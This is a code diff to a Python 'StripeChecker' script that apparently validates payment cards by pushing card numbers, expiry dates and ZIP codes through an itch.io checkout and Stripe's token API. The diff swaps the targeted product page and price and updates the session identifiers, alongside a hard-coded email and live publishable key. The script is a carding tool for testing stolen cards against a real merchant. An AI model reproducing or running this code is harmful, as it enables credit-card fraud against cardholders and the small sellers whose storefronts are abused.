@@ -33,8 +33,8 @@ fg = [
 class StripeChecker():
 
     def __init__(self):
-        self.main_domain = "https://puppetcombo.itch.io/nun-massacre"
-        self.purchase = "https://puppetcombo.itch.io/nun-massacre/purchase"
+        self.main_domain = "https://yellowafterlife.itch.io/gamemaker-raw-input"
+        self.purchase = "https://yellowafterlife.itch.io/gamemaker-raw-input/purchase"
         self.stripe_tokens = "https://api.stripe.com/v1/tokens"
 
         print("\n\n  {}------=[ {}MVP ALPHA CHECKER {}]=------".format(fg[0], fg[1], fg[0]))
@@ -108,9 +108,9 @@ class StripeChecker():
                 "csrf_token": csrf,
                 "source": "stripe",
                 "medium": "default",
-                "initiator": "game",
+                "initiator": "extension",
                 "bp": "5fec4dab005917f29afb03f4685d3af9",
-                "price": "$4.95",
+                "price": "$14.95",
                 "email": "kathrynzuniga1715@gmail.com",
                 "json": "true"
             }
@@ -128,9 +128,9 @@ class StripeChecker():
                 'card[exp_month]': ccMonth,
                 'card[exp_year]': ccYear,
                 'card[address_zip]': zipcode,
-                'guid': 'd9b4344d-6d6c-484b-8090-717f17007393',
+                'guid': 'aac3b98b-a38c-4a77-88e5-d686e18913be',
                 'muid': '40df7419-6e26-4d26-9901-b7f817fae510',
-                'sid': 'd91e9a68-e526-42e7-978d-2a076a455daa',
+                'sid': '807a3b36-89ae-4449-99bb-2c29e01f6496',
                 'payment_user_agent': 'stripe.js/81b45a76; stripe-js-v3/81b45a76',
                 'referrer': checkout_url,
                 'key': 'pk_live_YpSNu1qXLz2bvSUqP7TK7P9U',
